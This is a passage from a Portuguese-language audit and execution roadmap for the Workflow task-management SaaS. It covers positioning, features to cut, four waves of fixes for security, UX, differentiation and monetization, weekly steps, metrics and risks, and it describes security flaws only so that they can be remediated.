3. **O faturamento por horas paga a assinatura no primeiro mês.** Se o produto mostra 8 horas faturáveis que a pessoa teria esquecido de cobrar, a assinatura se pagou. Esse é o argumento mais forte disponível e é esforço M, não G.
4. **O portal do cliente é o que sustenta o degrau de preço.** Sem ele o produto compete com Trello. Com ele, não compete com ninguém.

### 5.5 O produto como vantagem competitiva da sua agência

Esta parte não é sobre o SaaS. É sobre o que você ganha usando o próprio produto com os clientes da Stack Roads, mesmo que ele nunca venda uma assinatura.

**1. Você entrega gestão junto com o serviço, sem custo marginal.**
Um portal com a sua marca onde o cliente vê o roadmap do mês, o que foi entregue e o status do que ele pediu é uma entrega **percebida**. A maior parte da insatisfação de cliente de agência não é sobre resultado, é sobre não saber o que está acontecendo. Isso é uma proposta comercial melhor pelo mesmo preço.

**2. Você economiza a hora mais cara que existe: a de tradução.**
Toda reclamação que chega por vídeo e vira tarefa especificada é uma hora de alguém sênior que não foi gasta escutando áudio e escrevendo ticket. Numa agência de 6 pessoas isso é facilmente 3 a 5 horas por semana.

**3. Você para de perder dinheiro em hora não cobrada.**
`TimeEntry.billable` já existe. Falta valor-hora e fechamento. Toda agência pequena que eu conheço perde de 5% a 15% do faturamento em hora trabalhada e não registrada. Esse é dinheiro seu, não do SaaS.

**4. O cofre de variáveis já é uma vantagem operacional que ninguém vê.**
Credencial de cliente numa planilha ou no WhatsApp é o padrão do mercado. Você tem criptografia e escopo por empresa. Isso é um argumento de contrato com cliente maior e um redutor de risco real seu (com a ressalva do Problema 4: conserte a chave antes de vender isso como diferencial).

**5. Você é o cliente zero com o ICP exato.**
Essa é a vantagem estrutural mais subestimada. Você não precisa de pesquisa de mercado: cada dor sua é literalmente a dor do comprador. As sete queixas que motivaram este documento são um roadmap de produto de graça. A maioria dos fundadores paga caro para conseguir esse sinal.

**6. O produto vira peça de venda da agência.**
"Trabalhamos com um painel onde você acompanha tudo e reporta problemas gravando a tela" é diferenciação numa proposta comercial de agência. Cliente que compara três propostas e vê isso numa delas lembra dela.

**E agora as duas armadilhas dessa posição, porque elas são reais:**

**Armadilha A: viés de cliente único.** Você vai construir o que a Stack Roads precisa e chamar de produto. Sintoma já visível no código: o mapa de empresas hardcoded no importador de Jira (`workflow-api/src/import/import.service.ts:6-10`), com ids de produção da PET e da FC no fonte. Isso é código de consultoria vestido de feature. Regra prática: **toda feature nova precisa fazer sentido para um cliente que você nunca viu**. Se a resposta for "mas eu preciso disso agora", faça como script, não como feature.

**Armadilha B: acoplamento de risco.** Hoje, se o Workflow cair, os projetos dos seus clientes ficam sem gestão, e o problema é seu duas vezes: como fornecedor do software e como fornecedor do serviço. Isso é aceitável enquanto o produto é interno, e vira inaceitável no dia do primeiro contrato com SLA. Os pré-requisitos disso estão todos no Problema 10 e no Problema 2: ambiente separado, CI, error tracking, backup testado, config de deploy versionada.

**Uma decisão de posicionamento que vale tomar cedo:** separe as marcas. "Workflow, by Stack Roads" no login e no rodapé é honesto e vende as duas coisas. "Stack Roads Workflow" amarra o produto ao seu tamanho de agência e cria conflito no dia em que uma agência concorrente for avaliar a compra. A seção 4.4 já recomenda essa arquitetura de marca por motivos visuais; ela também é a certa por motivos comerciais.

### 5.6 O que eu deliberadamente cortaria ou congelaria

Opinião forte, porque roadmap é sobre o que não fazer.

**Cortar de vez:**

- **`WorkspaceView.vue`** (974 linhas, sem rota, terceira implementação do mesmo board). Deletar.
- **`useTasks.ts`** (mock de "Empresa A/B/C" com datas de 2024, importado por duas telas de produção). Deletar.
- **`core/index.ts`, `AppBar.vue`, `NavigationDrawer.vue`, `AuroraBackground.vue`** e os seis barris `index.ts` de feature que ninguém importa. Deletar.
- **A rota `/download`**, que aponta para um artefato de GitHub Actions expirado e quebra para qualquer visitante.
- **O card de plano falso** na sidebar, até existir billing.
- **Model `Ticket`** (zero referências em `src/`) e os `BugReportMessage` órfãos.
- **`GET /company/all`** e **`GET /user`**, que além de vazarem são features que ninguém pediu.

**Congelar com data marcada:**

- **Canvas colaborativo.** 3.275 linhas mais Yjs, Hocuspocus e `perfect-freehand` no bundle de produção, com a feature desligada por flag. Ou liga, ou tira do bundle. Congelar significa: `() => import()` no router para sair do chunk inicial e uma nota dizendo quando volta. Se a resposta honesta for "não volta", delete e libere ~2,6 MB de dependências.
- **Modo XP.** É charmoso, é bem-feito, e consumiu 6 commits seguidos dos shells enquanto o FocusShell não recebia correção funcional. Mantenha, não invista mais até o Onda 3 acabar.
- **Integração com GitHub.** Hoje é read-only e desconectada das tarefas: não existe vínculo entre `Repository` e `Activity`, nem "commit fecha tarefa". Ou seja, é um browser de repositórios dentro de um gestor de tarefas. Ou conecta às tarefas (aí tem valor), ou congela. E enquanto congelada, **conserte o escopo por empresa**, porque hoje é um furo de segurança (Problema 1).

**Não construir agora, apesar de tentador:**

- **App mobile nativo.** Antes disso, faça os três shells terem uma única media query. Hoje o app é literalmente inutilizável em celular apesar de as views serem responsivas: o esqueleto é que nunca foi. Um shell responsivo é esforço G e entrega 90% do valor de um app.
- **Modelo `Project` sob `Company`.** É a modelagem certa a longo prazo (hoje dois projetos do mesmo cliente exigem dois CNPJs, porque `Company.cnpj` é `@unique` e obrigatório), mas é esforço GG e não destrava receita. O que destrava agora é tornar o CNPJ **opcional**, que é uma linha de migration.
- **Colunas de kanban configuráveis por empresa.** É a feature que transforma "ferramenta interna" em "SaaS que a empresa cliente adota", mas exige sair do enum Postgres de 4 valores para uma tabela `BoardColumn`. Vale, e é Onda 4 ou depois.
- **SSO.** Só importa acima de 50 pessoas, que não é o ICP.

### 5.7 O produto em três frases, daqui a 12 meses

Se tudo der certo, é isto que eu gostaria de conseguir dizer:

> **Para a agência:** "Todo trabalho que a gente faz para cada cliente está aqui: o que ele pediu, o que a gente prometeu, quem está fazendo, quantas horas custou e quanto disso vira nota. Toda segunda de manhã eu recebo o resumo por e-mail e mando para o cliente sem editar nada."

> **Para o cliente da agência:** "Quando alguma coisa quebra, eu gravo 30 segundos da tela e mando. Já chega escrito direitinho para eles, e eu acompanho num link que não precisa de senha."

> **Para o mercado:** "É a única ferramenta de gestão de trabalho em que o cliente do seu cliente entra."

Nada nessas três frases exige tecnologia que você não tenha. Todas exigem coisas que ainda não existem.

---

## 6. Roadmap de execução em ondas

Legenda de esforço: **P** até 1 dia, **M** de 2 a 5 dias, **G** de 1 a 3 semanas, **GG** mais de 3 semanas.

Regra que atravessa as quatro ondas: **nada de big bang**. Cada item entrega valor sozinho e pode ser interrompido sem deixar o produto pior. Se o roadmap parar na Onda 2, o que foi feito continua valendo.

---

### Onda 1: higiene e confiança (semanas 1 e 2)

**Por que primeiro.** Três motivos, nessa ordem. (a) Enquanto o desenvolvimento acontece dentro da produção, toda outra onda é feita com risco de destruir dado de cliente. (b) Enquanto o isolamento entre empresas estiver furado, qualquer venda morre no primeiro questionário de segurança, e um incidente entre dois clientes seus é um problema seu. (c) Enquanto não houver CI e error tracking, todas as refatorações das ondas seguintes são feitas no escuro.

Esta onda quase não produz feature visível. Ela produz **permissão para trabalhar**.

| # | Item | Esforço | Por que agora |
|---|---|---|---|
| 1.1 | Projeto Supabase de desenvolvimento, `.env` locais apontando para ele, `NODE_ENV` definido, seed mínimo | **P** para o ambiente, **M** com seed | Bloqueia tudo. Primeiro item, mesmo dia |
| 1.2 | Rotacionar a senha do Postgres de produção | **P** | Senha de dicionário no superusuário. De brinde mata o parser manual de connection string |
| 1.3 | Fail-fast no boot para `JWT_SECRET`, `ENCRYPTION_KEY`, `QR_PUBLIC_BASE_URL`; remover o fallback `'1234...'` do `CryptoService`; `decrypt` lança em vez de devolver ciphertext; corrigir o `.env.example` | **P** | Sem isso, um deploy sem env grava segredo de cliente com chave pública. E QR sem `QR_PUBLIC_BASE_URL` aponta para localhost, e QR impresso não se conserta |
| 1.4 | Corrigir os dois `v-html` de `TaskDetailsView.vue` (`:758-762` e `:1390`) usando o `useMarkdownRenderer` que já existe | **P** | XSS armazenado com cadeia completa até token de 7 dias com todas as empresas |
| 1.5 | Restringir CORS a allowlist por env; `helmet()`; headers de segurança no `vercel.json` (CSP, X-Frame-Options, HSTS) | **P** | Última linha de defesa do item anterior |
| 1.6 | Decorator `@CompanyId()` lendo `request.companyId`, aplicado em todos os handlers que hoje usam `@Param('companyId')` ou `@Query('companyId')`; `companyId` no where de `getReport`/`updateReport`/`improveReport` | **M** | O furo principal. Cinco endpoints, cadeia de exploração documentada |
| 1.7 | Remover `GET /company/all` e `GET /user`; corrigir `PATCH /user/:id/discord` para usar o `sub` do token | **P** | Vazam a base de clientes com CNPJ e o diretório de usuários com e-mail |
| 1.8 | `@RequireRole(ADMIN)` mais escopo por empresa em `github-connection`, `import/jira-xml` e `notifications/run-now`; DTO com `@IsUrl` no webhook do Discord; apagar o `COMPANY_MAP` hardcoded | **P** | Escrita cross-tenant e SSRF |
| 1.9 | Validar `responsibleUserIds` contra `userCompany` no create e no update de `Activity` | **P** | Hoje o título de uma tarefa chega por socket para alguém de fora da empresa |
| 1.10 | Exigir `companyId` no `GET /roadmap/monthly` (hoje `undefined` faz o Prisma omitir o filtro) | **P** | Vazamento de leitura em uma linha |
| 1.11 | GitHub Actions nos dois repos: `typecheck` mais `lint` sem `--fix` mais `build`, obrigatório em PR, `main` protegida; adicionar `lint:check` e `format:check` | **P** | Gate mínimo entre "escrevi" e "está em produção" |
| 1.12 | Suíte e2e de matriz de tenancy: usuário de A batendo em cada rota company-scoped com id de B, esperando 403 ou 404 | **M** | É o que impede a regressão de 1.6 a 1.10 voltar. Melhor relação custo/risco do repo |
| 1.13 | Sentry na API e no front, com `app.config.errorHandler` e `unhandledrejection`, correlacionado pelo `x-request-id` que já existe (e cujo `getApiRequestId` está exportado e nunca usado) | **P** | Suporte com evidência em vez de tentativa de reprodução |
| 1.14 | Versionar config de deploy da API (`railway.json` ou `Dockerfile`), corrigir `start:prod` (aponta para arquivo inexistente), adicionar `engines`, tirar `docs/` do `.gitignore`, colocar `prisma migrate deploy` no pipeline | **P** | Hoje o comando real de produção não está documentado em lugar nenhum |
| 1.15 | Limpeza: deletar `WorkspaceView.vue`, `useTasks.ts`, `core/index.ts`, `AppBar.vue`, `NavigationDrawer.vue`, `AuroraBackground.vue`, os seis barris órfãos, os ~429 KB de assets duplicados em `public/`, a rota `/download`, o card de plano falso, o model `Ticket` | **P** | ~1.900 linhas mais 429 KB de superfície mental que atrapalha todas as ondas seguintes |
| 1.16 | Corrigir `src/CLAUDE.md` e `docs/api-services.md` (afirmam coisas falsas sobre `AuroraBackground`, `<Transition>`, `/tickets`, contagem de `mdi-` e "roadmap mockado") | **P** | Doc errada custa mais caro que doc ausente, porque induz você e o agente ao erro |
| 1.17 | Instrumentar os eventos-chave no PostHog e definir o evento de ativação | **P** | O mais barato da lista e o que mais muda decisão nas ondas 3 e 4 |
| 1.18 | Performance de entrada: `vueDevTools` explicitamente só em dev, remover o barril do Vuetify, lazy loading nas rotas, `manualChunks` | **P a M** | Corta mais de 70% do bundle inicial. Impacto imediato e visível, inclusive para o público 50+ em máquina fraca |
| 1.19 | Migrar os 32 `mdi-` para lucide e remover `@mdi/font` | **M** | Elimina 3,6 MB de fontes em quatro formatos |
| 1.20 | Higiene visual da marca: unmatting dos PNGs, script inline de tema no `<head>` (fim do flash branco), favicon apontando para o `favicon.ico` que já existe, tirar os travessões da copy do `index.html` | **P** | Primeira impressão do produto, em toda sessão |

**Fim da Onda 1, o que mudou para você:** você consegue desenvolver sem medo, o produto para de vazar dado entre clientes, o app abre rápido, a marca para de ficar esquisita no dark, e você tem um lugar que avisa quando algo quebra.

---

### Onda 2: as suas dores (semanas 3 a 8)

**Por que agora e não antes.** Porque essas são as coisas que você sente todo dia, e porque a Onda 1 tornou possível mexer nelas sem risco. E porque tudo aqui também é pré-requisito de venda: ninguém compra uma ferramenta cujo board não bate os números.

**Ordem interna deliberada:** primeiro o que faz a tela parar de mentir (barato e alto impacto de confiança), depois o que muda o fluxo de trabalho, depois o que exige refatoração estrutural.

| # | Item | Queixa | Esforço | Por que nessa ordem |
|---|---|---|---|---|
| 2.1 | `parentId: null` no `where` do `getWorkspace` | 4.1 | **P** | Uma linha. O board e o dashboard param de contar subtarefa como tarefa |
| 2.2 | Corrigir `Number(x) \|\| 1` nos seis pontos; permitir `dueDate: null`; rollback no `toggleSubtaskStatus`; `saving` por campo | 4.7 | **P** | São bugs que a migração para auto-save carregaria junto e amplificaria |
| 2.3 | `features/tasks/priority.ts` como fonte única (label, token, ordem), consumido pelas 4 telas; `@Max` no DTO; migração de dados se a escala inverter | 4.1 | **M** | Parar de mentir sobre a prioridade. Decisão de escala na seção 7 |
| 2.4 | `patchActivityStatus` mandando `x-company-id` explícito do card | 4.1 | **P** | Arrastar card de outra empresa no `/board` deixa de falhar sempre |
| 2.5 | `scrollBehavior` custom resolvendo o container do shell; `goBack` com `router.back()`; `refetchOnMount: 'always'` no `useCompanyBoards`; `invalidateBoards` em toda mutação | 4.6 | **M** | Meio da queixa 4.6 resolvido em poucos dias. O `scrollBehavior` precisa ser o custom, senão parece que não funciona |
| 2.6 | Filtro por pessoa, por mês, "só as minhas" e "atrasadas" no `/board`, client-side, com estado na query string; filtro por `userId` no `TasksView` alimentado por `members`; remover o `filterStatus` morto | 4.1 | **M** | Sua queixa número 1, e os dados já chegam. De brinde, filtro vira link compartilhável |
| 2.7 | `useSession()` e `useCompanySwitch()` únicos, com `queryClient.clear()` e `realtimeService.disconnect()`; eleger uma fonte de verdade para empresa ativa e deletar `authStores` | 4.6 | **P a M** | Risco de dado entre usuários e entre empresas, e causa de bugs intermitentes de "veio da empresa errada" |
| 2.8 | Emitir `activity:created`, `activity:updated`, `activity:deleted` e evento de anexo; gravar feed no `update`; derivar rooms do socket da membership no banco; filtrar `feed:new` e `comment:new` por `companyId` no front | 4.6 | **M** | O realtime passa a cobrir o que o usuário espera. Metade backend, metade front |
| 2.9 | Registry única de navegação (`src/core/navigation/registry.ts`) consumida pelos shells, pela paleta e pelo menu XP; `route.meta.title` derivado dela; `useActiveRole()` único usado pelo menu e pelo guard | 4.5 | **M** | Mata onze pontos de edição, o "Forge", os destinos que somem no estilo 2 e o bug do `activeRole` null |
| 2.10 | Roadmap fase A: `select` com `id/title/status/dueDate/responsibles`, pins de entrega no front, wire do CRUD que já existe no service, categorias no formulário, `@click` nos dias, `loadError` que não zera dados, service de milestones | 4.3 | **M a G** | Precisa dos elos 1 e 2 juntos para produzir efeito visível. Fazer só um não muda nada na tela |
| 2.11 | Edição direta fase 1: `useQuery(['activity', id])` mais `useActivityMutations` com otimista, rollback e invalidações | 4.7 | **M** | Sem mudança visual, mas resolve o "voltei e o card está velho" e é pré-requisito de tudo em 4.7 |
| 2.12 | Edição direta fase 2: status, prioridade, data e responsáveis inline; `SaveIndicator` | 4.7 | **M** | Aqui você sente a mudança |
| 2.13 | Card grande como painel sobre o board (rota aninhada), com aba de Histórico (`GET /backlog/activity/:id`, endpoint pronto) e tempo apontado (infra pronta) | 4.2 | **G** | O histórico e o tempo são **P** cada porque os endpoints existem. O painel é o trabalho de verdade |
| 2.14 | Edição direta fases 3 a 5: título e descrição inline com debounce, subtarefas inline, remoção do modal, merge de campo remoto | 4.7 | **M a G** | Precisa das regras de conflito escritas antes (seção 4.7) |
| 2.15 | Marca em SVG com tokens (`BrandMark` inline), `CompanyAvatar` com monograma determinístico, rampas de status por tema, teste de contraste em CI | 4.4 | **M** | O `CompanyAvatar` é o que faz o board multi-empresa ficar escaneável |
| 2.16 | Coluna de contexto do FocusShell com `<slot name="context">` por rota; `<RouterLink>` no lugar de `<button @click>`; `aria-current`, `<nav aria-label>`, skip link; `overflow` no rail; `CompanySwitcher` na `slim-top` | 4.5 | **G** | É o que transforma o estilo 2 no melhor shell em vez do pior. Os filtros do board caem naturalmente na coluna |
| 2.17 | Ordenação fracionária da coluna com contrato `{ beforeId, afterId }`; índices que faltam (`Activity(parentId)`, `Activity(dueDate)`, `ActivityResponsible(activityId)`, `ActivityLog(activityId, changedAt)`) | 4.1 | **M** | **Pré-requisito do filtro server-side**: com filtro, o índice `position` que o front envia se refere à lista filtrada e destrói a ordem real |
| 2.18 | `Activity.companyId` denormalizado com backfill, mais `GET /activities` com filtros compostos e cursor | 4.1 | **G** | Destrava board multi-mês, filtro por pessoa server-side, `groupBy` nos dashboards e a blindagem de tenant por extensão do Prisma |
| 2.19 | Escala tipográfica em tokens com `calc(N * var(--font-scale))`; stylelint proibindo literal | 4.4 | **G** | Faz o "aumento de fonte" finalmente funcionar, e é fundação dos primitivos |

**Fim da Onda 2, o que mudou para você:** as sete queixas estão endereçadas, o produto para de mentir, e as telas que você usa todo dia ficam agradáveis. É também o momento em que faz sentido mostrar o produto para um estranho sem pedir desculpa.

---

### Onda 3: diferenciação (meses 3 e 4)

**Por que agora.** Porque só depois da Onda 2 o produto aguenta um usuário que não é você. E porque o wedge exige que o núcleo esteja confiável: colocar o cliente do seu cliente dentro de um produto que perde estado e não notifica é pior do que não colocar.

| # | Item | Esforço | Por que |
|---|---|---|---|
| 3.1 | `MailModule` com SendGrid: convite, reset de senha, "seu bug report virou tarefa", "3 tarefas vencem amanhã", digest semanal | **M** | Pré-requisito de **tudo** nesta onda e na próxima. A dependência já está paga e nunca foi importada |
| 3.2 | Onboarding self-serve: rota `/welcome` detectando zero empresas, criação com nome e slug, **CNPJ opcional**, seed de dados de exemplo removível, checklist de primeiros passos | **G** | Sem isso não existe trial nem demonstração honesta, e cada cliente custa uma intervenção sua no banco |
| 3.3 | Model `Invitation` (token, e-mail, papel, expiração), `POST /company/:id/invite`, tela de aceite que cria a conta já vinculada; aposentar a lista global de usuários | **M** | Fecha o furo de PII e destrava crescimento de assentos |
| 3.4 | Papel `CLIENT` no `CompanyRole`, com escopo derivado do que o `ShareLink` já faz | **M** | Hoje convidar o cliente significa dar acesso ao cofre de credenciais e ao time tracking. Por isso ninguém convida |
| 3.5 | **Portal do cliente**: rota `/portal` com login por link mágico; board filtrado, roadmap do ano, bug reports do próprio cliente, comentários; logo e cor da agência por empresa; e-mail em cada mudança de status | **G** | **É o wedge.** A pasta `features/portal/` está vazia no repo, o que sugere que a ideia já existia |
| 3.6 | Fechar o loop do bug report: usar o `reporterContact` que já é gravado para avisar em cada transição; link curto de acompanhamento | **P** depois de 3.1 | O loop de valor mais óbvio do produto está aberto por falta de e-mail |
| 3.7 | Relatório executivo automático: entregas, atrasos, tarefas por pessoa, horas, bugs recebidos e resolvidos, narrativa gerada pelo `copilot.digest`, PDF com pdfkit (já em uso) e e-mail às segundas | **M** | O artefato que justifica a assinatura para quem não usa o produto. Toda a matéria-prima existe |
| 3.8 | Faturamento por horas: valor-hora por pessoa e por projeto, fechamento de mês com total em reais, PDF com marca, exportação CSV para o contador | **M** | Receita direta e mensurável **para o cliente**. Paga a assinatura no primeiro mês |
| 3.9 | Roadmap fase B: `RoadmapEntry.activityId` e sync automático de entregas a partir de `dueDate` | **G** | Transforma o roadmap de segundo lugar de digitação em fonte de verdade derivada |
| 3.10 | Copiloto que executa: ferramentas `create_task`, `move_task`, `assign_task`, `add_comment`, `start_timer`, com confirmação antes de executar e registro no `FeedEvent` | **M** | Infra de agente pronta. Multiplica valor percebido sem base nova |
| 3.11 | Roadmap público que vende: só meses com conteúdo, capa com logo, badges de status, contador de entregas, OG tags, marca d'água discreta | **M** | Aquisição orgânica de graça, e argumento de renovação de contrato |
| 3.12 | Shell responsivo de verdade: um breakpoint nos três shells, drawer com backdrop, bottom bar de 4 destinos derivada da registry, `100dvh` | **G** | Hoje o app é inutilizável em celular apesar de as views serem responsivas. Gestor que quer olhar o board no domingo não consegue |
| 3.13 | WhatsApp como entrada de bug report (API oficial ou provedor), criando `BugReport` pelo mesmo caminho | **G** | O canal onde o cliente PME brasileiro realmente está |
| 3.14 | Primitivos de UI: `Button`, `Field`, `Card`, `Avatar`, `Badge`, `Dialog`, mais uma rota escondida `/design-system` mostrando tudo nos 2 temas, 4 escalas e 2 densidades | **G** | Nove implementações de `.btn-primary` hoje. Sem primitivos, o portal e o card grande viram a décima |
| 3.15 | Higiene de escala: `pgvector` com índice HNSW, embeddings fora do processo HTTP, reindexação incremental, `take` com cursor nos `findMany` que crescem, `groupBy` nas contagens | **M a G** | É o que quebra primeiro se o uso dobrar. Fazer antes de ter clientes pagantes é barato; depois é incidente |

**Fim da Onda 3, o que mudou:** o produto tem uma razão de existir que nenhum concorrente vai copiar, e tem um artefato semanal que lembra o cliente de por que ele paga. Aqui já dá para vender por venda direta.

---

### Onda 4: monetização (meses 5 e 6)

**Por que por último.** Não por ser menos importante, e sim porque cobrar antes dos itens da tabela de bloqueadores (seção 5.4) produz churn e reembolso. Cobrança é a coisa mais fácil de ligar e a mais cara de ligar cedo demais.

| # | Item | Esforço | Por que |
|---|---|---|---|
| 4.1 | `AiUsage` (empresa, feature, tokens, custo estimado), quota mensal por plano, painel de consumo; trocar o throttle por IP por throttle por empresa | **M** | **Antes** de cobrar. Hoje a margem de IA por cliente é desconhecida e um cliente pesado é subsidiado pelos outros |
| 4.2 | Models `Plan`, `Subscription`, `UsageCounter`; gateway brasileiro com PIX e boleto (Asaas, Pagar.me ou Stripe com PIX); trial de 14 dias | **G** | O núcleo da cobrança |
| 4.3 | O card da sidebar passa a mostrar uso real, com estados de "perto do limite" e "no limite", e o botão abre o dialog de planos; replicado nos três shells pela registry | **M** | É o metro quadrado mais caro da UI, hoje decoração morta |
| 4.4 | Tela de cobrança, upgrade, downgrade, cancelamento e recibo por e-mail | **M** | Sem isso, cada mudança de plano é uma conversa com você |
| 4.5 | White-label do portal e dos PDFs (logo e cor por empresa) como feature de plano alto | **M** | Sustenta o degrau de preço fixo do Estúdio |
| 4.6 | API pública v1 generalizando o padrão do QR: escopos no token (`tasks:read`, `time:read`, `qr:write`), `POST /api/v1/tasks`, `GET /api/v1/board`, webhooks de saída assinados com HMAC a partir dos `FeedEvent`, docs vivas | **M a G** | Degrau de plano e retenção do cliente técnico. Integra n8n, Make e Zapier sem construir cada integração |
| 4.7 | LGPD: exportação completa por empresa em JSON e CSV, exclusão de conta com carência, política e DPA | **M** | Bloqueia contrato formal. Hoje não existe `DELETE /user` nem portabilidade |
| 4.8 | Migração assistida visível: Jira XML (já pronto e escondido), Trello JSON, CSV e Excel, com pré-visualização e mapeamento de campos | **M** | O custo de troca é o principal motivo de não adotar, e metade disso já existe sem entrada na navegação |
| 4.9 | Soft delete, lixeira e `ActivityLog` generalizado por campo (`field`, `from`, `to`, `actorId`) | **G** | "Quem mudou meu prazo?" e "restaurar o que apaguei" são perguntas de cliente pagante |
| 4.10 | Redis adapter no socket.io, presença fora do processo, e então escala horizontal | **M** | Só faz sentido quando houver carga que justifique, mas **antes** de qualquer segunda réplica |
| 4.11 | Colunas de kanban configuráveis por empresa (`BoardColumn`, saindo do enum Postgres) | **G** | O que transforma "ferramenta interna" em "SaaS que a empresa cliente adota". Bom candidato a primeiro item da Onda 5 |

**Fim da Onda 4:** o produto cobra, mede a própria margem, e tem um caminho de upgrade que não passa por você.

---

### O que fica de fora, e por quê

Não estão em nenhuma onda, deliberadamente:

- **Modelo `Project` e `Client` sob `Company`** (esforço GG). É a modelagem correta a longo prazo, mas não destrava receita. O que destrava agora é CNPJ opcional, que está na Onda 3 item 3.2 e custa uma migration.
- **App mobile nativo.** O shell responsivo (3.12) entrega 90% do valor por uma fração do custo.
- **SSO.** Só importa acima de 50 pessoas, fora do ICP.
- **Multi-idioma.** Zero i18n hoje, tudo hardcoded em pt-BR. Só importa quando houver cliente com filial fora, e aí é um projeto próprio.
- **Voltar o canvas colaborativo.** Ou liga com dono e roadmap, ou apaga e libera as dependências do bundle.

---

### 6.1 A primeira semana, dia a dia

A Onda 1 tem 20 itens e isso assusta. Na prática, os cinco primeiros dias resolvem o que é irreversível. Sugestão de sequência, montada de forma que cada dia termine com algo que pode ir para produção sozinho:

**Dia 1: parar de escrever em produção.**
Criar o projeto Supabase de desenvolvimento, apontar os dois `.env` locais, definir `NODE_ENV`, rodar `prisma migrate deploy` no banco novo, e rotacionar a senha do Postgres de produção. Nada mais nesse dia. Se o dia acabar e só isso estiver feito, o dia foi excelente: você deixou de arriscar dado de cliente todo dia.

**Dia 2: fechar o que sangra na aplicação.**
Os dois `v-html` de `TaskDetailsView.vue`, o fail-fast das envs no boot, remover o fallback do `CryptoService`, `decrypt` lançando erro, corrigir o `.env.example`, restringir o CORS por allowlist, headers de segurança no `vercel.json`. Tudo isso é edição pequena e independente. Fecha o XSS e a corrupção silenciosa de segredo.

**Dia 3: o furo de tenant, parte 1.**
Decorator `@CompanyId()`, aplicado nos handlers de `quarter`, `backlog`, `report` e `dashboard`. Mais `companyId` no where de `getReport`, `updateReport` e `improveReport`. Remover `GET /company/all` e `GET /user` (checar antes quem os consome: o `AddUserModal` usa `GET /user`, então ou ele migra para `GET /user/search` no mesmo PR, ou fica temporariamente quebrado de propósito com um aviso, o que é aceitável porque o fluxo já é ruim).

**Dia 4: o furo de tenant, parte 2, e o gate.**
`@RequireRole(ADMIN)` e escopo em `github-connection`, `import/jira-xml` e `notifications/run-now`. `companyId` obrigatório no `GET /roadmap/monthly`. Validação de `responsibleUserIds` contra `userCompany`. E subir o GitHub Actions com `typecheck`, `lint` sem `--fix` e `build`, com a `main` protegida. A partir daqui, nada entra sem passar.

**Dia 5: a rede e a limpeza.**
Sentry nos dois repos com `errorHandler` e `unhandledrejection`. Config de deploy da API versionada e `start:prod` corrigido. E o PR de limpeza: os ~1.900 linhas órfãs, os 429 KB de assets duplicados, a rota `/download`, o card de plano falso, o `useTasks.ts` mock. É o PR mais gostoso da semana e o que mais reduz superfície mental para tudo que vem depois.

**Semana 2:** a suíte e2e de tenancy (que trava a regressão dos dias 3 e 4), a instrumentação do PostHog, a performance de entrada (lazy loading, barril do Vuetify, `manualChunks`, remoção do `@mdi/font`) e a higiene visual da marca.

Uma observação sobre ordem: a suíte de testes vem **depois** das correções, não antes. Testar primeiro seria mais elegante, e seria mais lento para parar o sangramento. O compromisso honesto é: corrija, e escreva o teste no mesmo sprint, não no mesmo dia.

---

### 6.2 Como saber se cada onda funcionou

Roadmap sem métrica vira lista de desejos. Estas são baratas de medir e dizem a verdade.

**Onda 1 (higiene e confiança).**
- A suíte e2e de tenancy passa com 100% dos casos "usuário de A não lê dado de B". Métrica binária, e é a única que importa nesta onda.
- Tamanho do chunk inicial do front. Baseline hoje: 3,2 MB de JS mais 1,38 MB de CSS mais 3,6 MB de fontes. Meta: abaixo de 800 KB de JS no chunk inicial.
- Tempo até o formulário de login aparecer em conexão simulada de 3G. Meça antes e depois; é o número que o cliente sente.
- Número de erros capturados pelo Sentry na primeira semana. Se for zero, a instrumentação está errada, não o produto.

**Onda 2 (suas dores).**
- Os contadores do `/board` batem com os do `/tasks/:month` para a mesma empresa e mês. Teste manual de 2 minutos, e hoje falha.
- Quantas vezes por semana você precisa dar F5 para ver um dado atualizado. Anote antes de começar; é a métrica mais honesta da queixa 4.6.
- Tempo para responder "o que a pessoa X entrega em março". Hoje é impossível sem exportar; meta: 3 cliques.
- Número de cliques para mudar o status de uma tarefa a partir do detalhe. Hoje: sair da tela e arrastar. Meta: 1.

**Onda 3 (diferenciação).**
- Bug reports recebidos por semana **pelo portal**, versus por WhatsApp e e-mail. Essa razão é o indicador direto do wedge funcionando.
- Percentual de bug reports que viram tarefa sem edição manual da especificação gerada. Se for baixo, o problema é o prompt, não o produto.
- Clientes finais que abriram o portal pelo menos uma vez no mês. Se ninguém abre, o portal não é o wedge e é melhor descobrir cedo.
- Taxa de ativação definida na Onda 1 (empresa criada com 3 tarefas, 1 convite e 1 bug report em 7 dias). Sem esse número, a Onda 4 é precificada no escuro.

**Onda 4 (monetização).**
- Custo de IA por empresa por mês, que hoje é literalmente desconhecido. Se a margem de um plano for negativa, você quer saber no mês 1, não no mês 12.
- Conversão de trial para pago, e onde o trial morre (o funil do PostHog responde).
- Receita por cliente atendido, não só por assento. É a métrica que valida o empacotamento proposto na seção 5.4.

---

### 6.3 Riscos de execução deste roadmap

Quatro itens têm risco real de dar errado, e vale ter o plano de contorno escrito antes.

**Risco 1: a migração de prioridade inverte o significado de dados existentes.**
Escolher P0 igual a crítico (Decisão 5) exige um `UPDATE` que remapeia toda tarefa criada pelo formulário. Se a fonte única `priority.ts` subir sem a migration, toda tarefa criada até hoje aparece como crítica. **Contorno:** faça a migration e a fonte única no mesmo deploy, com um script reversível, e valide num snapshot do banco de dev antes. E avise os usuários, porque prioridade é um campo que as pessoas olham.

**Risco 2: a migration de `Quarter.year` toca 17 lugares que fazem o join de tenant.**
Adicionar ano muda a unicidade e o seeding, e o seeding lazy por ano é um comportamento novo que pode criar registros duplicados se rodar concorrente. **Contorno:** faça `Activity.companyId` **antes** de `Quarter.year`, porque com `companyId` denormalizado as queries param de depender do join e a migration seguinte fica isolada. E crie os quarters do ano numa transação com `ON CONFLICT DO NOTHING`.

**Risco 3: unificar os shells quebra o modo XP.**
O `xp.css` esconde `.sidebar`, `.rail` e `.context` por seletor de classe, com `!important` global, e esses são nomes genéricos. Consolidar shells renomeia ou remove essas classes. **Contorno:** trate o XP como consumidor de primeira classe da registry na mesma PR, e teste as duas variantes de shell com XP ligado e desligado antes do merge. Há um risco latente já documentado: se o Canvas voltar com XP ligado, `xp.css` aplica `height: calc(100vh - 30px)` na seção do board de desenho, que usa a mesma classe `.canvas-shell` para outra coisa.

**Risco 4: prefixar todas as query keys por empresa invalida tudo de uma vez.**
